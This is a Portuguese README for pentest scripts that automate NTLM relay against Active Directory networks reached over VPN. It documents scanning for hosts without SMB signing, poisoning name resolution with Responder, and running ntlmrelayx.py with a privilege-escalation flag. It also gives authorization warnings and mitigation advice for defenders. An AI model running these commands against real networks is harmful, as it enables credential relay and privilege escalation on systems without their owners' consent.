# AD VPN Lateral Movement PoCs

Repositório com scripts para validação controlada de cenários de rede interna acessada via VPN, com foco em SMB/NTLM, monitoramento de tráfego, análise de exposição e validação de riscos associados a configurações inseguras em ambientes Active Directory.

Os scripts devem ser usados somente em ambientes autorizados, laboratórios, CTFs ou testes formais de segurança com escopo explícito.

---

## Visão geral dos scripts

| Script | Objetivo | Quando usar |
|---|---|---|
| `ip_takeover_monitor.sh` | Configura um IP na interface VPN e monitora tráfego de rede | Usar para observar tráfego SMB, NetBIOS, DNS, HTTP e ARP em cenário controlado. |
| `gerar_targets_relay.sh` | Gera lista de hosts com SMB signing desativado | Usar quando o objetivo for apenas identificar alvos para validação de relay NTLM. |
| `vpn_lateral_attach.sh` | Identifica hosts com SMB signing desativado e prepara validação de relay NTLM | Usar em teste autorizado de rede interna/AD para validar risco de relay NTLM com fluxo automatizado. |

---

# Fluxo recomendado de uso

A ordem mais lógica para utilização dos scripts é:

```text
1. ip_takeover_monitor.sh
   ↓
2. gerar_targets_relay.sh
   ↓
3. vpn_lateral_attach.sh
```

## Explicação rápida do fluxo

Primeiro, use o `ip_takeover_monitor.sh` para configurar um IP na interface VPN e observar o comportamento da rede. Depois, use o `gerar_targets_relay.sh` quando quiser apenas listar hosts com SMB signing desativado. Por fim, use o `vpn_lateral_attach.sh` quando o objetivo for executar o fluxo mais completo, incluindo configuração de IP/rota, identificação de alvos, Responder, `ntlmrelayx.py` e monitoramento de tráfego.

---

# Scripts

## ip_takeover_monitor.sh

### Descrição

O `ip_takeover_monitor.sh` configura um IP específico em uma interface VPN e inicia uma sessão `tmux` com ferramentas de monitoramento de tráfego.

O script abre painéis para execução do Responder, captura de pacotes com `tcpdump` e monitoramento de tráfego ARP. Ele é útil para observar comportamento de rede em cenários internos acessados via VPN.

### O que o script faz

- Finaliza processos antigos que possam causar conflito;
- Configura um IP específico na interface VPN;
- Adiciona rota para a rede definida;
- Cria diretório local para logs;
- Inicia uma sessão `tmux`;
- Executa o Responder na interface configurada;
- Monitora tráfego SMB, NetBIOS, DNS, HTTP e ARP com `tcpdump`.

### Cenário de uso

Use este script quando for necessário monitorar tráfego de rede em um ambiente interno acessado via VPN.

Ele é indicado para validações de laboratório, análise de comportamento de rede, identificação de tráfego broadcast/multicast e observação de serviços expostos em um segmento autorizado.

### Campos que devem ser alterados

Antes de executar, revise e ajuste as variáveis no início do script:

```bash
TARGET_IP="IP_VPN"
NET_CIDR="24"
INTERFACE="tun0"
SESSION="ip_monitor"
LOG_DIR="/tmp/ip_takeover_logs"
DUMP_FILE="$LOG_DIR/tcpdump_$TARGET_IP.pcap"
```

### Explicação dos campos

| Campo | Descrição |
|---|---|
| `TARGET_IP` | IP que será configurado na interface VPN para o cenário de monitoramento. Substitua por um IP autorizado dentro da rede VPN. |
| `NET_CIDR` | Máscara da rede em formato CIDR. Exemplo: `24`. |
| `INTERFACE` | Interface de rede/VPN que será utilizada. Exemplo: `tun0`. |
| `SESSION` | Nome da sessão `tmux` criada pelo script. |
| `LOG_DIR` | Diretório onde logs e capturas poderão ser armazenados. |
| `DUMP_FILE` | Caminho do arquivo `.pcap`, caso o script seja ajustado para salvar a captura em arquivo. |

### Exemplo de configuração

```bash
TARGET_IP="10.10.10.88"       # IP autorizado que será configurado na interface VPN
NET_CIDR="24"                 # Máscara da rede
INTERFACE="tun0"              # Interface VPN
SESSION="ip_monitor"
LOG_DIR="/tmp/ip_takeover_logs"
DUMP_FILE="$LOG_DIR/tcpdump_$TARGET_IP.pcap"
```

### Como usar

Dê permissão de execução:

```bash
chmod +x ip_takeover_monitor.sh
```

Execute:

```bash
./ip_takeover_monitor.sh
```

---

## gerar_targets_relay.sh

### Descrição

O `gerar_targets_relay.sh` é um script auxiliar para gerar uma lista de alvos SMB compatíveis com validação de relay NTLM.

Ele executa uma varredura SMB na faixa de rede definida, identifica hosts com SMB signing desativado e salva os resultados no formato esperado pelo `ntlmrelayx.py`.

### O que o script faz

- Executa varredura SMB na rede definida;
- Filtra hosts com `Signing: False`;
- Formata os alvos no padrão `smb://IP`;
- Salva a lista no arquivo definido em `TARGETS_FILE`;
- Exibe os alvos encontrados no terminal.

### Cenário de uso

Use este script quando o objetivo for apenas gerar a lista de hosts com SMB signing desativado, sem iniciar automaticamente Responder, `ntlmrelayx.py` ou captura de tráfego.

Ele é útil para separar a etapa de descoberta da etapa de validação, permitindo revisar os alvos antes de avançar para testes mais sensíveis.

### Campos que devem ser alterados

Antes de executar, revise e ajuste as variáveis no início do script:

```bash
RANGE="10.50.103.0/24"
TARGETS_FILE="/tmp/relay_targets.txt"
```

### Explicação dos campos

| Campo | Descrição |
|---|---|
| `RANGE` | Faixa de rede interna autorizada para varredura SMB. |
| `TARGETS_FILE` | Caminho do arquivo onde serão salvos os hosts com SMB signing desativado. |

### Exemplo de configuração

```bash
RANGE="10.10.10.0/24"                 # Faixa de rede autorizada no teste
TARGETS_FILE="/tmp/relay_targets.txt" # Arquivo de saída para uso com ntlmrelayx.py
```

### Como usar

Dê permissão de execução:

```bash
chmod +x gerar_targets_relay.sh
```

Execute:

```bash
./gerar_targets_relay.sh
```

### Saída esperada

O script gera um arquivo com alvos no seguinte formato:

```text
smb://10.10.10.15
smb://10.10.10.22
smb://10.10.10.30
```

Esse arquivo pode ser usado posteriormente com o `ntlmrelayx.py`:

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -tf /tmp/relay_targets.txt
```

---

## vpn_lateral_attach.sh

### Descrição

O `vpn_lateral_attach.sh` automatiza a preparação de uma interface VPN para validação de risco em ambiente interno, com foco em SMB signing desativado e possibilidade de relay NTLM.

O script configura IP e rota na interface definida, realiza uma varredura SMB na rede, identifica hosts com `Signing: False` e prepara uma sessão `tmux` com ferramentas de apoio para validação e monitoramento.

### O que o script faz

- Finaliza processos antigos que possam causar conflito;
- Libera portas que podem estar ocupadas por serviços anteriores;
- Configura IP e rota na interface VPN;
- Executa varredura SMB na rede definida;
- Filtra hosts com SMB signing desativado;
- Gera um arquivo com alvos no formato esperado;
- Inicia uma sessão `tmux`;
- Executa Responder;
- Executa `ntlmrelayx.py` com a lista de alvos filtrados;
- Monitora tráfego relevante com `tcpdump`.

### Cenário de uso

Use este script em testes internos autorizados de Active Directory ou redes corporativas acessadas via VPN, quando o objetivo for validar o risco associado a hosts com SMB signing desativado.

Ele é indicado para demonstrar que a ausência de SMB signing pode expor sistemas a ataques de relay NTLM, dependendo do contexto, permissões e controles existentes no ambiente.

### Campos que devem ser alterados

Antes de executar, revise e ajuste as variáveis no início do script:

```bash
IP="10.50.103.88"          # Substituir pelo IP autorizado da VPN
CIDR="24"                  # Máscara da rede
IFACE="tun0"               # Interface VPN
RELAY_USER="usuario_autorizado"
TARGETS="/tmp/relay_targets.txt"
SESSION="vpn_attack"
```

### Explicação dos campos

| Campo | Descrição |
|---|---|
| `IP` | IP que será configurado na interface VPN para execução do teste. |
| `CIDR` | Máscara da rede em formato CIDR. Exemplo: `24`. |
| `IFACE` | Interface de rede/VPN utilizada no teste. Exemplo: `tun0`. |
| `RELAY_USER` | Usuário usado no parâmetro de validação do relay. Deve ser definido conforme o escopo autorizado. |
| `TARGETS` | Caminho do arquivo temporário onde serão salvos os hosts com SMB signing desativado. |
| `SESSION` | Nome da sessão `tmux` criada pelo script. |

### Campos adicionais que devem ser revisados

Além das variáveis iniciais, revise também a rede usada na rota e na varredura:

```bash
sudo ip route add 10.50.103.0/24 dev $IFACE
sudo crackmapexec smb 10.50.103.0/24 > /tmp/cme_scan.txt
```

Esses valores devem ser alterados conforme a rede autorizada no teste.

### Exemplo de configuração

```bash
IP="10.10.10.88"
CIDR="24"
IFACE="tun0"
RELAY_USER="usuario_autorizado"
TARGETS="/tmp/relay_targets.txt"
SESSION="vpn_validation"
```

Também ajuste a rede:

```bash
sudo ip route add 10.10.10.0/24 dev $IFACE
sudo crackmapexec smb 10.10.10.0/24 > /tmp/cme_scan.txt
```

### Como usar

Dê permissão de execução:

```bash
chmod +x vpn_lateral_attach.sh
```

Execute:

```bash
./vpn_lateral_attach.sh
```

---

# Dependência externa: ntlmrelayx.py

O script `vpn_lateral_attach.sh` utiliza o `ntlmrelayx.py`, ferramenta do projeto Impacket mantido pela Fortra, para apoiar a validação de cenários de relay NTLM contra hosts previamente identificados com SMB signing desativado.

Por padrão, o script espera que o `ntlmrelayx.py` esteja disponível no seguinte caminho local:

```bash
/usr/share/doc/python3-impacket/examples/ntlmrelayx.py
```

Caso o ambiente utilize outro caminho, ajuste esta linha no script:

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -tf $TARGETS --escalate-user=$RELAY_USER
```

Exemplos de caminhos comuns:

```bash
/usr/share/doc/python3-impacket/examples/ntlmrelayx.py
/usr/share/impacket/examples/ntlmrelayx.py
/opt/impacket/examples/ntlmrelayx.py
```

Para localizar o arquivo no sistema:

```bash
find /usr /opt -name ntlmrelayx.py 2>/dev/null
```

Referência oficial:

```text
https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py
```

Recomendação: não copie o `ntlmrelayx.py` para este repositório. Mantenha como dependência externa do Impacket para evitar uso de versão desatualizada e reduzir manutenção desnecessária.

---

# Requisitos

Os scripts foram criados para execução em Linux, especialmente distribuições usadas em testes de segurança, como Kali Linux.

## Pacotes e ferramentas necessárias

```text
bash
sudo
iproute2
tmux
tcpdump
psmisc
Responder
CrackMapExec
Impacket
ntlmrelayx.py
Python 3
```

## Instalação de pacotes básicos

Em Debian, Ubuntu ou Kali:

```bash
sudo apt update
sudo apt install -y tmux tcpdump psmisc iproute2 python3 python3-pip
```

## Instalação do Impacket

Em alguns ambientes, o Impacket pode ser instalado via pacote do sistema:

```bash
sudo apt install -y python3-impacket
```

Depois, valide se o `ntlmrelayx.py` existe:

```bash
find /usr /opt -name ntlmrelayx.py 2>/dev/null
```

Caso use instalação via `pipx` ou ambiente virtual, valide o caminho real da ferramenta e ajuste o script conforme necessário.

## Instalação do Responder

Em Kali Linux, normalmente o Responder já vem disponível ou pode ser instalado com:

```bash
sudo apt install -y responder
```

Valide a instalação:

```bash
responder -h
```

## Instalação do CrackMapExec

Dependendo da distribuição, o CrackMapExec pode não estar disponível no repositório padrão.

Valide primeiro:

```bash
crackmapexec --help
```

Caso não esteja instalado, use o método compatível com o seu ambiente.

---

# Ajustes necessários no sistema

Antes de executar os scripts, valide os seguintes pontos no ambiente local.

## 1. Interface VPN ativa

Confirme se a interface informada no script existe:

```bash
ip addr
```

Exemplo esperado:

```text
tun0
```

Se a interface for diferente, altere no script:

```bash
IFACE="tun0"
```

ou:

```bash
INTERFACE="tun0"
```

## 2. Permissão de execução

Aplique permissão nos scripts:

```bash
chmod +x ip_takeover_monitor.sh
chmod +x gerar_targets_relay.sh
chmod +x vpn_lateral_attach.sh
```

## 3. Execução com privilégios

Os scripts usam comandos que exigem privilégio administrativo, como:

```text
ip addr flush
ip addr add
ip route add
tcpdump
responder
fuser
pkill
```

Execute com um usuário que tenha permissão de `sudo`.

## 4. Portas em conflito

O `vpn_lateral_attach.sh` tenta liberar portas que podem estar em uso por serviços anteriores:

```text
80/tcp
445/tcp
135/tcp
```

Antes de executar, valide se não há serviços críticos usando essas portas no seu ambiente local.

Comando útil:

```bash
sudo ss -tulpn | grep -E ':80|:135|:445'
```

## 5. Caminho do ntlmrelayx.py

Valide o caminho do `ntlmrelayx.py`:

```bash
find /usr /opt -name ntlmrelayx.py 2>/dev/null
```

Se o retorno for diferente do caminho configurado no script, ajuste a linha:

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -tf $TARGETS --escalate-user=$RELAY_USER
```

## 6. Faixa de rede autorizada

Confirme a faixa de rede liberada no escopo do teste.

No `gerar_targets_relay.sh`, ajuste:

```bash
RANGE="10.10.10.0/24"
```

No `vpn_lateral_attach.sh`, ajuste:

```bash
sudo ip route add 10.10.10.0/24 dev $IFACE
sudo crackmapexec smb 10.10.10.0/24 > /tmp/cme_scan.txt
```

No `ip_takeover_monitor.sh`, ajuste:

```bash
TARGET_IP="10.10.10.88"
NET_CIDR="24"
```

## 7. Sessões tmux antigas

Os scripts tentam encerrar sessões antigas automaticamente, mas você também pode validar manualmente:

```bash
tmux ls
```

Para encerrar uma sessão específica:

```bash
tmux kill-session -t nome_da_sessao
```

---

# Compatibilidade com sistemas

## Sistema local de execução

| Ambiente | Compatibilidade |
|---|---|
| Kali Linux | Alta |
| Debian/Ubuntu | Compatível com ajustes de dependências |
| Windows | Não compatível diretamente |
| WSL | Pode ter limitações com interface de rede, VPN, raw sockets e captura de pacotes |
| macOS | Não recomendado sem adaptação |

## Ambiente alvo

| Ambiente alvo | Aplicabilidade |
|---|---|
| Active Directory | Alta |
| Rede interna via VPN | Alta |
| Hosts Windows com SMB | Alta |
| Ambientes com NTLM habilitado | Alta |
| Linux sem SMB/NTLM | Baixa |

---

# Observações importantes

Estes scripts possuem potencial de impacto em ambientes corporativos, principalmente por interagirem com tráfego de rede, SMB, NTLM, ARP e ferramentas de relay.

Antes de qualquer execução, valide:

- se o escopo autoriza testes em rede interna;
- qual interface VPN deve ser usada;
- qual faixa de IP está liberada;
- se o uso de Responder é permitido;
- se o uso de relay NTLM é permitido;
- quais horários e limites operacionais foram aprovados;
- quais evidências podem ser coletadas e armazenadas.

Não execute estes scripts em redes de terceiros, redes corporativas sem autorização formal ou ambientes produtivos sem regra de engajamento aprovada.

---

# Recomendações de mitigação

Para reduzir os riscos avaliados por estes scripts, recomenda-se habilitar SMB signing nos hosts Windows, desabilitar protocolos legados quando possível, restringir NTLM, aplicar segmentação de rede, limitar tráfego lateral entre estações e servidores, revisar permissões excessivas, monitorar autenticações suspeitas e fortalecer políticas de hardening em ambientes Active Directory.

Também é recomendado monitorar tráfego LLMNR, NetBIOS, WPAD, SMB e tentativas de relay, além de revisar eventos de autenticação e movimentação lateral nos sistemas de detecção corporativos.

---

# Observação de segurança

Estes scripts devem ser utilizados apenas em ambientes autorizados.

Eles podem capturar tráfego, interagir com serviços internos e validar condições exploráveis em redes corporativas. Portanto, o uso deve estar alinhado ao escopo formal do teste, às regras de engajamento e às permissões concedidas pelo responsável pelo ambiente.

Antes de executar em qualquer ambiente real, revise o código, entenda cada comando e remova qualquer ação que não seja necessária para a validação autorizada.

---

# Aviso legal

O uso destes scripts contra redes, sistemas ou ambientes sem autorização é proibido.

A finalidade deste repositório é exclusivamente apoiar atividades legítimas de segurança, como pentest autorizado, laboratório, estudo técnico, validação de configuração e demonstração controlada de risco.
